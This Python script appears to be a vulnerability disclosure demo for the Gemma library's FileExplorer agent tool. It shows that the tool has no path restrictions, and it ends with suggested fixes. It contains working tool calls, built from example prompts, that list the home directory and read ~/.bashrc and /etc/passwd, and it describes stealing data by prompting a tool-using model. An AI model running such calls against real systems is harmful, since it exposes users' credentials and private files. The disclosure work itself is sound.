r"""Security vulnerability demo: FileExplorer allows arbitrary file reads.

This demonstrates a security issue in `gemma.gm.tools._file_explorer.FileExplorer`:

The tool is marked as "read-only" but has NO path restrictions. It can read
ANY file or directory accessible to the process, including:
- ~/.ssh/* (private keys, config)
- Environment files (.env, .bashrc, etc.)
- System files (/etc/passwd, /etc/shadow on some systems)
- API keys, tokens, credentials stored in user directories
- Any other sensitive data

This is a serious security risk when used in tool-using agents, as an attacker
could potentially exfiltrate sensitive data through the model's tool calls.

Run:
  python examples/file_explorer_security_demo.py
"""

from __future__ import annotations

import json
import os

# IMPORTANT: ensure we import the local checkout, not an installed `gemma`
# package from site-packages.
import sys

_REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _REPO_ROOT not in sys.path:
  sys.path.insert(0, _REPO_ROOT)

from gemma.gm.tools import _file_explorer
from gemma.gm.tools import _manager as _manager_lib


def simulate_attack_scenario(
    user_prompt: str,
    model_tool_call_json: str,
    sensitive_path: str,
) -> None:
  """Simulates a complete attack scenario showing the vulnerability."""
  print("=" * 80)
  print("ATTACK SCENARIO: Attacker prompts model to read sensitive files")
  print("=" * 80)
  print()

  # Step 1: Show the user prompt (what attacker sends)
  print("STEP 1: User/Attacker Prompt")
  print("-" * 80)
  print(user_prompt)
  print()

  # Step 2: Show the model's response (tool call JSON)
  print("STEP 2: Model Response (Tool Call)")
  print("-" * 80)
  print("The model decides to use the FileExplorer tool and outputs:")
  print()
  print(model_tool_call_json)
  print()

  # Step 3: Parse and execute the tool call
  print("STEP 3: Tool Manager Parses and Executes Tool Call")
  print("-" * 80)
  manager = _manager_lib.OneShotToolManager(tools=[_file_explorer.FileExplorer()])
  
  # Parse the tool call
  tool_kwargs = json.loads(model_tool_call_json)
  tool_name = tool_kwargs.pop("tool_name")
  method = tool_kwargs.get("method")
  path = tool_kwargs.get("path")
  
  print(f"Parsed tool call:")
  print(f"  - tool_name: {tool_name}")
  print(f"  - method: {method}")
  print(f"  - path: {path}")
  print()

  # Step 4: Execute the tool and show the output
  print("STEP 4: Tool Execution Result (SENSITIVE DATA EXPOSED)")
  print("-" * 80)
  print(f"⚠️  SECURITY RISK: FileExplorer has NO path restrictions!")
  print(f"   Reading: {path}")
  print()
  
  tool_result = manager.maybe_execute_tool(model_tool_call_json)
  if tool_result:
    print("Tool output (first 500 chars):")
    print("-" * 80)
    output_text = tool_result.text.replace("[Tool result: ", "").replace("]", "")
    print(output_text[:500])
    if len(output_text) > 500:
      print(f"\n... (truncated, total length: {len(output_text)} chars)")
    print()
    print("⚠️  VULNERABILITY CONFIRMED: Sensitive file content was exposed!")
  else:
    print("(Tool execution failed or returned None)")
  print()


def main() -> None:
  print("=" * 80)
  print("SECURITY VULNERABILITY DEMO: FileExplorer Arbitrary File Access")
  print("=" * 80)
  print()
  print(
      "This demo shows how an attacker could use a tool-using LLM agent to"
  )
  print("exfiltrate sensitive data by prompting the model to read arbitrary files.")
  print()
  print("The FileExplorer tool has NO path restrictions - it can access ANY file")
  print("the process has read permissions for, including:")
  print("  - SSH keys and config (~/.ssh/*)")
  print("  - Environment files (.bashrc, .env, etc.)")
  print("  - System files (/etc/passwd, etc.)")
  print("  - API keys, tokens, credentials")
  print()
  print("=" * 80)
  print()

  # Attack Scenario 1: Read user's home directory listing
  print("\n" + "=" * 80)
  user_prompt_1 = "Can you list the files in my home directory? I want to see what's there."
  model_response_1 = json.dumps({
      "tool_name": "fileexplorer",
      "method": "ls",
      "path": os.path.expanduser("~"),
  })
  simulate_attack_scenario(
      user_prompt_1,
      model_response_1,
      os.path.expanduser("~"),
  )

  # Attack Scenario 2: Read sensitive config file
  print("\n" + "=" * 80)
  user_prompt_2 = "What's in my .bashrc file? I forgot what I configured."
  model_response_2 = json.dumps({
      "tool_name": "fileexplorer",
      "method": "cat",
      "path": os.path.expanduser("~/.bashrc"),
  })
  simulate_attack_scenario(
      user_prompt_2,
      model_response_2,
      os.path.expanduser("~/.bashrc"),
  )

  # Attack Scenario 3: Read system file
  print("\n" + "=" * 80)
  user_prompt_3 = "Show me the contents of /etc/passwd"
  model_response_3 = json.dumps({
      "tool_name": "fileexplorer",
      "method": "cat",
      "path": "/etc/passwd",
  })
  simulate_attack_scenario(
      user_prompt_3,
      model_response_3,
      "/etc/passwd",
  )

  # Summary
  print("=" * 80)
  print("SECURITY IMPACT SUMMARY")
  print("=" * 80)
  print()
  print("The FileExplorer tool has NO path restrictions. In a tool-using agent:")
  print("  1. An attacker can prompt the model to read arbitrary files")
  print("  2. The model generates a tool call JSON (as shown above)")
  print("  3. The tool manager executes the call without validation")
  print("  4. Sensitive data is exposed in the tool output")
  print()
  print("This is a serious security vulnerability that could lead to:")
  print("  - Credential theft (SSH keys, API tokens, passwords)")
  print("  - System information disclosure (/etc/passwd, config files)")
  print("  - Privacy violations (user data, personal files)")
  print()
  print("SUGGESTED FIX:")
  print("  - Restrict FileExplorer to a sandbox directory (e.g., repo root)")
  print("  - Require an explicit allowlist of permitted paths")
  print("  - Add path validation before executing file operations")
  print("  - Consider disabling in production/non-notebook contexts")
  print("=" * 80)


if __name__ == "__main__":
  main()
